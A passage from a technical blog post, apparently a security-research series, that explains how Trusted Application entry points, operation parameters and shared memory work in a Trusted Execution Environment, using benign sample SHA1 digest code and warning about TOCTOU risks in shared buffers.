+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;opened</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/* Memory management and TEEC_InvokeCommand() */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/* Cleanup used connection/resources */</span>
+</span></span><span style=display:flex><span>end_4:
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Releasing shared out memory..</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>TEEC_ReleaseSharedMemory</span>(<span style=color:#f92672>&amp;</span>out_mem);
+</span></span><span style=display:flex><span>end_3:
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Releasing shared in memory..</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>TEEC_ReleaseSharedMemory</span>(<span style=color:#f92672>&amp;</span>in_mem);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Closing session..</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>TEEC_CloseSession</span>(<span style=color:#f92672>&amp;</span>session);
+</span></span><span style=display:flex><span>end_2:
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Finalizing ctx..</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>TEEC_FinalizeContext</span>(<span style=color:#f92672>&amp;</span>context);
+</span></span><span style=display:flex><span>end_1:
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;END: example SHA1 calc app</span><span style=color:#ae81ff>\n\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>exit</span>(tee_rv);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The Entry Point functions that we mentioned in the TAs API are 1-to-1 mapped to functions available to clients through the client API:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>TA_OpenSessionEntryPoint   <span style=color:#f92672>&lt;-&gt;</span> TEEC_OpenSession
+</span></span><span style=display:flex><span>TA_CloseSessionEntryPoint  <span style=color:#f92672>&lt;-&gt;</span> TEEC_CloseSession
+</span></span><span style=display:flex><span>TA_InvokeCommandEntryPoint <span style=color:#f92672>&lt;-&gt;</span> TEEC_InvokeCommand
+</span></span></code></pre></div><p>The Entry Points <code>TA_CreateEntryPoint</code> and <code>TA_DestroyEntryPoint</code> do not directly map to any client API. This is because when <code>TEEC_OpenSession</code> is invoked, a TA instance will be created if no TA instance exists.</p><p>You might stumble upon on some other functions, such as <code>TEE_OpenTASession</code>, <code>TEE_InvokeTACommand</code>, or <code>TEE_CloseTASession</code>. These are APIs available within the TEE only. Generally, the prefix <code>TEE_</code> is used for APIs inside the TEE and the prefix <code>TEEC_</code> for APIs available to clients that are running in the REE. The reason that the <code>TEE_OpenTASession</code>, <code>TEE_InvokeTACommand</code>, and <code>TEE_CloseTASession</code> functions exist is that TA-to-TA communication is also possible and takes place entirely within the TEE. However, TA-to-TA communication is not something we will deepen any further here.</p><h3 id=33-parameters-and-ta-commands>3.3 Parameters and TA commands</h3><p>Great! At this point we know:</p><ol><li>The structure of a TA</li><li>The lifecycle of the TA</li><li>How to communicate with the TA</li></ol><p>However, there is one important thing left to cover. And that is parameters passed from the client to the TA. Since our goal is to exploit a TA, our attack surface is more or less the parameters and commands that the TA expects. Let&rsquo;s focus on the <code>TA_OpenSessionEntryPoint</code> and <code>TA_InvokeCommandEntryPoint</code> implemented by the digest example TA:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>TEE_Result TA_EXPORT <span style=color:#a6e22e>TA_OpenSessionEntryPoint</span>(<span style=color:#66d9ef>uint32_t</span> paramTypes, TEE_Param params[<span style=color:#ae81ff>4</span>], <span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>sessionContext)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  algorithm_Identifier hash;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Calling the Open session entry point&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>TEE_PARAM_TYPE_GET</span>(paramTypes, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>!=</span> TEE_PARAM_TYPE_VALUE_INPUT) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Bad parameter at index 0: expexted value input&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TEE_ERROR_BAD_PARAMETERS;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span> (params[<span style=color:#ae81ff>0</span>].value.a) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>case</span> HASH_MD5:
+</span></span><span style=display:flex><span>    hash <span style=color:#f92672>=</span> TEE_ALG_MD5;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>case</span> HASH_SHA1:
+</span></span><span style=display:flex><span>    hash <span style=color:#f92672>=</span> TEE_ALG_SHA1;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Unknow hash algorithm&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> TEE_ERROR_BAD_PARAMETERS;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>TEE_AllocateOperation</span>((TEE_OperationHandle <span style=color:#f92672>*</span>)sessionContext, hash, TEE_MODE_DIGEST, <span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>TEE_Result TA_EXPORT <span style=color:#a6e22e>TA_InvokeCommandEntryPoint</span>(<span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>sessionContext,
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>uint32_t</span> commandID,
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>uint32_t</span> paramTypes,
+</span></span><span style=display:flex><span>            TEE_Param params[<span style=color:#ae81ff>4</span>])
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  TEE_Result tee_rv <span style=color:#f92672>=</span> TEE_SUCCESS;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Calling the Invoke command entry point&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (commandID <span style=color:#f92672>==</span> HASH_RESET) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>TEE_ResetOperation</span>(sessionContext);
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (commandID <span style=color:#f92672>==</span> HASH_UPDATE) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>TEE_PARAM_TYPE_GET</span>(paramTypes, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>!=</span> TEE_PARAM_TYPE_MEMREF_INPUT) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Bad parameter at index 0: expexted memory input&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> TEE_ERROR_BAD_PARAMETERS;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>TEE_DigestUpdate</span>(sessionContext, params[<span style=color:#ae81ff>0</span>].memref.buffer, params[<span style=color:#ae81ff>0</span>].memref.size);
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (commandID <span style=color:#f92672>==</span> HASH_DO_FINAL) {
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>TEE_PARAM_TYPE_GET</span>(paramTypes, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>!=</span> TEE_PARAM_TYPE_NONE <span style=color:#f92672>&amp;&amp;</span>
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>TEE_PARAM_TYPE_GET</span>(paramTypes, <span style=color:#ae81ff>0</span>) <span style=color:#f92672>!=</span> TEE_PARAM_TYPE_MEMREF_INPUT) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Bad parameter at index 0: expexted memory input&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> TEE_ERROR_BAD_PARAMETERS;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>TEE_PARAM_TYPE_GET</span>(paramTypes, <span style=color:#ae81ff>1</span>) <span style=color:#f92672>!=</span> TEE_PARAM_TYPE_MEMREF_OUTPUT) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Bad parameter at index 1: expexted memory output&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> TEE_ERROR_BAD_PARAMETERS;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEE_DigestDoFinal</span>(sessionContext, params[<span style=color:#ae81ff>0</span>].memref.buffer,
+</span></span><span style=display:flex><span>        params[<span style=color:#ae81ff>0</span>].memref.size, params[<span style=color:#ae81ff>1</span>].memref.buffer,
+</span></span><span style=display:flex><span>        <span style=color:#f92672>&amp;</span>params[<span style=color:#ae81ff>1</span>].memref.size);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>OT_LOG</span>(LOG_ERR, <span style=color:#e6db74>&#34;Unknow command ID&#34;</span>);
+</span></span><span style=display:flex><span>    tee_rv <span style=color:#f92672>=</span> TEE_ERROR_BAD_PARAMETERS;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> tee_rv;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>When a Client opens a session on a TA or invokes a command, the client can send <strong>Operation Parameters</strong> to the TA. The parameters encode the data associated with the operation. Up to four parameters can be sent in an operation. Each parameter can be individually typed by the Client as a <strong>Value Parameter</strong>, or a <strong>Memory Reference Parameter</strong>. Each parameter is also tagged with a direction of data flow (input, output, or both input and output).</p><p><strong>Value Parameters</strong> carry two 32-bit integers (<code>TEEC_Value</code>).</p><p><strong>Memory Reference Parameters</strong>, carry a pointer to a client-owned memory buffer (<code>TEEC_RegisteredMemoryReference</code> or <code>TEEC_TempMemoryReference</code>). (For output Memory References, there is a built-in mechanism for the TAs to report the necessary size of the buffer in case of a too-short buffer.) Note that Memory Reference Parameters typically point to <strong>memory owned by the client and shared with the TA</strong> for the duration of the operation. This is especially useful in the case of REE Clients to minimize the number of memory copies and the data footprint in case a TA needs to deal with large data buffers. However, it can also have security implications as the memory is shared between the client running in the REE and the TA running in the TEE!</p><p><strong>A rogue client may well change the content of the shared memory buffer at any time, even between two consecutive memory accesses by the TA. This means that the TA needs to be carefully written to avoid any security problem if this happens and deal with TOCTOU vulnerabilities that may arise because of this. If values in the buffer are security critical, the TA should always read data only once from a shared buffer and then validate it. It must not assume that data written to the buffer can be read unchanged later on. The data should be copied to a TA instance-owned buffer.</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// TEEC_Operation Defines the payload of either an open session or invoke command
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> started;    <span style=color:#75715e>/*!&lt; Must set to zero if the client may try to cancel the operation */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> paramTypes; <span style=color:#75715e>/*!&lt; Encodes the type of each parameter that is being transferred */</span>
+</span></span><span style=display:flex><span>  TEEC_Parameter params[<span style=color:#ae81ff>4</span>]; <span style=color:#75715e>/*!&lt; an array of 4 possible paramaters to share with TA */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>imp; <span style=color:#75715e>//implementation defined
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} TEEC_Operation;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>union</span> {
+</span></span><span style=display:flex><span>  TEEC_TempMemoryReference tmpref;
+</span></span><span style=display:flex><span>  TEEC_RegisteredMemoryReference memref;
+</span></span><span style=display:flex><span>  TEEC_Value value;
+</span></span><span style=display:flex><span>} TEEC_Parameter;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Value Parameter
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> a;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> b;
+</span></span><span style=display:flex><span>} TEEC_Value;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// Uses a pre-registered memory or pre-allocated memory block
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>  TEEC_SharedMemory <span style=color:#f92672>*</span>parent; <span style=color:#75715e>/*!&lt; Either a whole or partial memory reference */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> size;               <span style=color:#75715e>/*!&lt; The size of the referenced memory region, in bytes */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> offset;             <span style=color:#75715e>/*!&lt; The offset in bytes of the referenced memory region */</span>
+</span></span><span style=display:flex><span>} TEEC_RegisteredMemoryReference;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>// A Temporary memory Reference
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>buffer; <span style=color:#75715e>/*!&lt; Pointer to the first byte of a buffer that needs to be referenced */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> size;  <span style=color:#75715e>/*!&lt; Size of the referenced memory region */</span>
+</span></span><span style=display:flex><span>} TEEC_TempMemoryReference;
+</span></span></code></pre></div><p>Memory References can be either a <strong>Registered Memory Reference</strong> or a <strong>Temporary Memory Reference</strong>.</p><p>A <strong>Registered Memory Reference</strong> is a region within a block of Shared Memory that was created before the (open session or invoke command) operation.</p><p>A <strong>Temporary Memory Reference</strong> directly specifies a buffer of memory owned by the CA, which is temporarily registered by the TEE Client API for the duration of the operation being performed.</p><p>Generally, a <strong>Memory Reference</strong> is a range of bytes which is actually shared (between the CA and TA) for a particular operation. A Memory Reference is described by either a <code>TEEC_MemoryReference</code> or <code>TEEC_TempMemoryReference</code> structure as shown above. It can specify either:</p><ul><li>A whole Shared Memory block. (<code>TEEC_MemoryReference</code>)</li><li>A range of bytes within a Shared Memory block. (<code>TEEC_MemoryReference</code>)</li><li>A pointer to a buffer of memory owned by the client, in which case this buffer is temporarily registered for the duration of the operation (<code>TEEC_TempMemoryReference</code>)</li></ul><p>The Memory Reference also specifies the direction in which data flows as it can be marked as input (client-to-TA), output (TA-to-client), or both.</p><p>A <strong>Shared Memory</strong> block is a region of memory allocated in the context of the client memory space that can be used to transfer data between that CA and a TA. A Shared Memory block can either be existing CA memory which is subsequently registered with the TEE Client API, or memory which is allocated on behalf of the CA using the TEE Client API. A Shared Memory block can be registered or allocated once and then used multiple times such as in multiple commands, and even in multiple Sessions, provided they exist within the scope of the TEE Context in which the Shared Memory was created. Overlapping Shared memory registrations are allowed and a single region of client memory may be registered multiple times.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#75715e>// A shared memory block that has been registered or allocated
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>buffer;   <span style=color:#75715e>/*!&lt; pointer to a memory buffer that is shared with TEE */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>size_t</span> size;    <span style=color:#75715e>/*!&lt; The size of the memory buffer in bytes */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> flags; <span style=color:#75715e>/*!&lt; bit vector that can contain TEEC_MEM_INPUT or TEEC_MEM_OUTPUT or both */</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>imp;      <span style=color:#75715e>// implementation defined
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} TEEC_SharedMemory;
+</span></span></code></pre></div><p><img src=/post-resources/TrustMEE/shared-memory-buffer-lifetime.png alt="Shared Memory Buffer Lifetime"></p><p>With all that said, let&rsquo;s see how the SHA1 client now communicates with the digest TA:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>()
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  TEEC_Context context;
+</span></span><span style=display:flex><span>  TEEC_Session session;
+</span></span><span style=display:flex><span>  TEEC_Operation operation;
+</span></span><span style=display:flex><span>  TEEC_SharedMemory in_mem;
+</span></span><span style=display:flex><span>  TEEC_SharedMemory out_mem;
+</span></span><span style=display:flex><span>  TEEC_Result tee_rv;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> data[DATA_SIZE];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint8_t</span> sha1[SHA1_SIZE];
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> i;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>START: example SHA1 calc app</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* ... Initialize data stuctures ... */</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* ... Initialize context towards TEE using TEEC_InitializeContext() ... */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Open session towards Digest TA by specifying the correct UUID */</span>
+</span></span><span style=display:flex><span>  operation.paramTypes <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_PARAM_TYPES</span>(TEEC_VALUE_INPUT, TEEC_NONE, TEEC_NONE, TEEC_NONE);
+</span></span><span style=display:flex><span>  operation.params[<span style=color:#ae81ff>0</span>].value.a <span style=color:#f92672>=</span> HASH_SHA1; <span style=color:#75715e>/* Open session is expecting HASH algorithm */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Openning session: &#34;</span>);
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_OpenSession</span>(<span style=color:#f92672>&amp;</span>context, <span style=color:#f92672>&amp;</span>session, <span style=color:#f92672>&amp;</span>uuid, TEEC_LOGIN_PUBLIC, NULL, <span style=color:#f92672>&amp;</span>operation, NULL);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_OpenSession failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> end_2;
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;opened</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Register shared memory for input */</span>
+</span></span><span style=display:flex><span>  in_mem.buffer <span style=color:#f92672>=</span> data;
+</span></span><span style=display:flex><span>  in_mem.size <span style=color:#f92672>=</span> DATA_SIZE;
+</span></span><span style=display:flex><span>  in_mem.flags <span style=color:#f92672>=</span> TEEC_MEM_INPUT;
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_RegisterSharedMemory</span>(<span style=color:#f92672>&amp;</span>context, <span style=color:#f92672>&amp;</span>in_mem);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Failed to register DATA shared memory</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> end_3;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Registered in mem..</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Invoke command from digest TA */</span>
+</span></span><span style=display:flex><span>  operation.paramTypes <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_PARAM_TYPES</span>(TEEC_MEMREF_WHOLE, TEEC_NONE, TEEC_NONE, TEEC_NONE);
+</span></span><span style=display:flex><span>  operation.params[<span style=color:#ae81ff>0</span>].memref.parent <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>in_mem;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Invoking command: Update sha1: &#34;</span>);
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_InvokeCommand</span>(<span style=color:#f92672>&amp;</span>session, HASH_UPDATE, <span style=color:#f92672>&amp;</span>operation, NULL);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_InvokeCommand failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> end_3;
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;done</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Register shared memory for output */</span>
+</span></span><span style=display:flex><span>  out_mem.buffer <span style=color:#f92672>=</span> sha1;
+</span></span><span style=display:flex><span>  out_mem.size <span style=color:#f92672>=</span> SHA1_SIZE;
+</span></span><span style=display:flex><span>  out_mem.flags <span style=color:#f92672>=</span> TEEC_MEM_OUTPUT;
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_RegisterSharedMemory</span>(<span style=color:#f92672>&amp;</span>context, <span style=color:#f92672>&amp;</span>out_mem);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEE_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Failed to allocate SHA1 shared memory</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> end_3;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Registered out mem..</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* Invoke second time from digest TA:
+</span></span></span><span style=display:flex><span><span style=color:#75715e>   * Send some more data to calculate the hash over, this will be added to the original hash.
+</span></span></span><span style=display:flex><span><span style=color:#75715e>   * This is not strictly needed it is a test for passing 2 memref params in a single
+</span></span></span><span style=display:flex><span><span style=color:#75715e>   * operation
+</span></span></span><span style=display:flex><span><span style=color:#75715e>   */</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>memset</span>(data, <span style=color:#e6db74>&#39;Z&#39;</span>, DATA_SIZE);
+</span></span><span style=display:flex><span>  operation.paramTypes <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_PARAM_TYPES</span>(TEEC_MEMREF_WHOLE, TEEC_MEMREF_WHOLE, TEEC_NONE, TEEC_NONE);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/*
+</span></span></span><span style=display:flex><span><span style=color:#75715e>   * reuse the original input shared memory, because we have just updated the contents
+</span></span></span><span style=display:flex><span><span style=color:#75715e>   * of the buffer
+</span></span></span><span style=display:flex><span><span style=color:#75715e>   */</span>
+</span></span><span style=display:flex><span>  operation.params[<span style=color:#ae81ff>0</span>].memref.parent <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>in_mem;
+</span></span><span style=display:flex><span>  operation.params[<span style=color:#ae81ff>1</span>].memref.parent <span style=color:#f92672>=</span> <span style=color:#f92672>&amp;</span>out_mem;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Invoking command: Do final sha1: &#34;</span>);
+</span></span><span style=display:flex><span>  tee_rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>TEEC_InvokeCommand</span>(<span style=color:#f92672>&amp;</span>session, HASH_DO_FINAL, <span style=color:#f92672>&amp;</span>operation, NULL);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (tee_rv <span style=color:#f92672>!=</span> TEEC_SUCCESS) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;TEEC_InvokeCommand failed: 0x%x</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, tee_rv);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>goto</span> end_4;
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;done</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;Calculated sha1: &#34;</span>);
